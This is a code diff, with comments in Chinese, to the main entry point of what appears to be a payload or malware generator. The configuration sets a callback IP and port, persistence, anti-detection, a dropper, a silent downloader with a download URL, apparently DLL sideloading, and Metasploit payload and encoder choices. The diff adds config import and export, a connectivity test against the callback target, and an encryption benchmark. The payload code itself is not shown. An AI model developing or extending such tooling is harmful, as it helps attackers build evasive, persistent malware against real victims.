@@ -33,30 +33,55 @@ def main():
         # 检查是否有命令行参数
         if len(sys.argv) > 1:
             args = command_line_mode()
-            config = {
-                'ip': args.ip,
-                'port': args.port,
-                'encryption_level': args.encryption_level,
-                'retry': args.retry,
-                'delay': args.delay,
-                'key_length': args.key_length,
-                'output_dir': args.output,
-                'filename': args.filename,
-                'persistence': args.persistence,
-                'anti_detection': args.anti_detection,
-                'use_dropper': args.use_dropper,
-                'use_white_black': args.use_white_black,
-                'white_black_mode': args.white_black_mode,
-                'use_downloader': args.use_downloader,
-                'download_url': args.download_url,
-                'downloader_silent': args.downloader_silent,
-                'silent_delay': args.silent_delay,
-                'use_msf': args.use_msf,
-                'msf_payload': args.msf_payload,
-                'msf_encoder': args.msf_encoder,
-                'msf_iterations': args.msf_iterations,
-                'msf_format': args.msf_format
-            }
+            
+            # 处理配置导入
+            if hasattr(args, 'import_config') and args.import_config:
+                from modules.config_manager import ConfigManager
+                manager = ConfigManager()
+                imported_config = manager.import_config(args.import_config)
+                if not imported_config:
+                    print("❌ 配置导入失败，使用默认配置")
+                    return 1
+                config = imported_config
+            else:
+                config = {
+                    'ip': args.ip,
+                    'port': args.port,
+                    'encryption_level': args.encryption_level,
+                    'retry': args.retry,
+                    'delay': args.delay,
+                    'key_length': args.key_length,
+                    'output_dir': args.output,
+                    'filename': args.filename,
+                    'persistence': args.persistence,
+                    'anti_detection': args.anti_detection,
+                    'use_dropper': args.use_dropper,
+                    'use_white_black': args.use_white_black,
+                    'white_black_mode': args.white_black_mode,
+                    'use_downloader': args.use_downloader,
+                    'download_url': args.download_url,
+                    'downloader_silent': args.downloader_silent,
+                    'silent_delay': args.silent_delay,
+                    'use_msf': args.use_msf,
+                    'msf_payload': args.msf_payload,
+                    'msf_encoder': args.msf_encoder,
+                    'msf_iterations': args.msf_iterations,
+                    'msf_format': args.msf_format,
+                    # 新增优化参数
+                    'debug': getattr(args, 'debug', False),
+                    'strict_mode': not getattr(args, 'no_strict', False),
+                    'test_connection': getattr(args, 'test_connection', False),
+                    'benchmark': getattr(args, 'benchmark', False)
+                }
+            
+            # 处理配置导出
+            if hasattr(args, 'export_config') and args.export_config:
+                from modules.config_manager import ConfigManager
+                manager = ConfigManager()
+                if manager.export_config(config, args.export_config):
+                    print("✅ 配置导出完成")
+                return 0
+            
             quiet = args.quiet
         else:
             config = interactive_mode()
@@ -71,6 +96,49 @@ def main():
         if not validate_port(str(config['port'])):
             print("❌ 端口号不正确")
             sys.exit(1)
+        
+        # 网络连通性测试
+        if config.get('test_connection', False):
+            if not quiet:
+                print("\n🌐 正在测试网络连通性...")
+            try:
+                from modules.network_test import comprehensive_network_test
+                if not comprehensive_network_test(config['ip'], config['port']):
+                    print("⚠️ 网络连通性测试失败，但继续生成载荷")
+                else:
+                    print("✅ 网络连通性测试通过")
+            except Exception as e:
+                print(f"⚠️ 网络测试异常: {e}")
+        
+        # 性能基准测试
+        if config.get('benchmark', False):
+            if not quiet:
+                print("\n⏱️ 正在运行性能基准测试...")
+            try:
+                import time
+                
+                test_data = "Performance test data " * 100  # ~2KB
+                cipher = AdvancedCipher("benchmark_key", config['encryption_level'])
+                
+                # 加密性能测试
+                start_time = time.time()
+                for _ in range(100):
+                    encrypted = cipher.multi_layer_encrypt(test_data)
+                encrypt_time = time.time() - start_time
+                
+                # 解密性能测试  
+                start_time = time.time()
+                for _ in range(100):
+                    decrypted = cipher.multi_layer_decrypt(encrypted)
+                decrypt_time = time.time() - start_time
+                
+                print(f"📊 基准测试结果:")
+                print(f"   加密性能: {encrypt_time:.3f}s (100次)")
+                print(f"   解密性能: {decrypt_time:.3f}s (100次)")
+                print(f"   平均延迟: {(encrypt_time + decrypt_time) / 200 * 1000:.2f}ms")
+                
+            except Exception as e:
+                print(f"⚠️ 基准测试异常: {e}")
         
         # 创建输出目录
         os.makedirs(config['output_dir'], exist_ok=True)
